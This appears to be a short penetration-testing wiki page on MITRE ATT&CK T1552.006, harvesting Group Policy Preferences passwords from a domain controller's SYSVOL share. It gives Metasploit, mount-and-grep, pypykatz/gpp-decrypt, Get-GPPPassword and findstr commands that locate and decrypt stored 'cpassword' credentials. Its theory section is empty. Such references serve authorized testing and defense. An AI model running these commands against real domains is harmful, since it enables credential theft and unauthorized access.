---
description: MITRE ATT&CK™ Sub-technique T1552.006
---

# 🛠️ Group Policies Preferences

## Theory

GPP \(Group Policy Preferences\) 

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
Tip : since the following operations require mounting of the SYSVOL share, it can't be done through a docker environment

msfconsole or manually finding them by mounting and grep, or accessing and manually open everything

```bash
use auxiliary/scanner/smb/smb_enum_gpp
msf auxiliary(smb_enum_gpp) > set RHOSTS $DOMAIN_CONTROLLER
msf auxiliary(smb_enum_gpp) > set SMBDomain $DOMAIN
msf auxiliary(smb_enum_gpp) > set SMBUser $DOMAIN_USER
msf auxiliary(smb_enum_gpp) > set SMBPass $DOMAIN_PASSWORD
msf auxiliary(smb_enum_gpp) > run
```

or manually mount and grep

```bash
# create the target directory for the mount
sudo mkdir /tmp/sysvol

# mount the SYSVOL share
sudo mount\
    -o domain='domain.local'\
    -o username='someuser'\
    -o password='password'\
    -t cifs\
    '//domain_controller/SYSVOL'\
    /tmp/sysvol

# recursively look for "cpassword" in Group Policies
sudo grep -ria cpassword /tmp/sysvol/'domain.local'/Policies/ 2>/dev/null

# decrypt the string and recover the password
pypykatz gppass j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
{% endtab %}

{% tab title="Windows" %}
must run in a authenticated context, see [impersonation](../impersonation.md)

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords

```bash
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

or manually with findstr

```bash
findstr /S /I cpassword \\$DOMAIN_CONTROLLER\sysvol\*.xml
```

or manually with use and open everything

```bash

```
{% endtab %}
{% endtabs %}

